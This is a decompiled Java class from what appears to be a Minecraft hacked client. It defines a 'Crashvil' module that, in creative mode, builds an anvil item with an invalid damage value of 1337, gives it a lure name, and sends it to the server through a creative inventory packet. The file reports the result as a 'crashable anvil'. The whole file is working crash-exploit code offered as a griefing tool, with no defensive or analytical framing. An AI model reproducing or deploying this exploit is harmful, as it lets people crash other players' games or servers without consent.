// 
// Decompiled by Procyon v0.5.30
// 

package cf.euphoria.euphorical.Mod.Collection.Misc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Item;
import net.minecraft.init.Blocks;
import cf.euphoria.euphorical.Utils.ChatUtils;
import cf.euphoria.euphorical.Mod.Category;
import cf.euphoria.euphorical.Mod.Mod;

public class Crashvil extends Mod
{
    public Crashvil() {
        super("Crashvil", Category.MISC);
    }
    
    @Override
    public void onEnable() {
        if (this.mc.thePlayer.inventory.getStackInSlot(0) != null) {
            ChatUtils.sendMessageToPlayer("Please clear the first slot in your hotbar.");
            this.setEnabled(false);
            return;
        }
        if (!this.mc.thePlayer.capabilities.isCreativeMode) {
            ChatUtils.sendMessageToPlayer("Creative mode only.");
            this.setEnabled(false);
            return;
        }
        final ItemStack stack = new ItemStack(Item.getItemFromBlock(Blocks.anvil));
        stack.setItemDamage(1337);
        stack.setStackDisplayName("Place me §c<3");
        this.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, stack));
        this.mc.thePlayer.closeScreen();
        ChatUtils.sendMessageToPlayer("Crashable anvil created.");
        this.setEnabled(false);
    }
}
